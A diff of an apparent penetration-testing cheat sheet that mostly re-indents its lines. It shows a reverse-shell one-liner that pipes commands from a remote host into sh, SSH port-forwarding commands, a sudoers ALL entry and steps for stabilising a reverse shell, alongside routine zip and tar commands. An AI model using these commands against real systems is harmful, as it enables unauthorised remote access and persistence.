@@ -108,8 +108,8 @@ cat < /dev/tcp/10.10.10.10/80 | sh #Victim
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Port Forwarding using SSH
     ssh -L 8888:localhost:8080 karthik@34.44.2.255 (with password)
- ssh -i private_key -L 8888:localhost:8080 username@targetip (with private key)
- (above syntax -L 8888(our machine port):localhost:8080(target machine localhost and ip to forward)
+     ssh -i private_key -L 8888:localhost:8080 username@targetip (with private key)
+      (above syntax -L 8888(our machine port):localhost:8080(target machine localhost and ip to forward)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    
@@ -122,23 +122,23 @@ usrname  ALL=(ALL:ALL) ALL
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Stabilizing the reverse shell:
   script /dev/null -c /bin/bash
-CTRL + Z
-stty raw -echo; fg
-Then press Enter twice, and then enter:
-export TERM=xterm
+   CTRL + Z
+   stty raw -echo; fg
+   Then press Enter twice, and then enter:
+    export TERM=xterm
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
  # Converting ova to vmdk and other extensions:
 
    zip archive.zip file1 file2 directory1
-unzip archive.zip (to extract .zip)
+    unzip archive.zip (to extract .zip)
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
 #  tar compression
  tar -cvf archive.tar file1 file2 directory1
-tar -cvzf archive.tar.gz file1 file2 directory1
-tar -cvjf archive.tar.bz2 file1 file2 directory1
-tar -cvJf archive.tar.xz file1 file2 directory1
+  tar -cvzf archive.tar.gz file1 file2 directory1
+  tar -cvjf archive.tar.bz2 file1 file2 directory1
+  tar -cvJf archive.tar.xz file1 file2 directory1
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # tar -xvf archive.tar
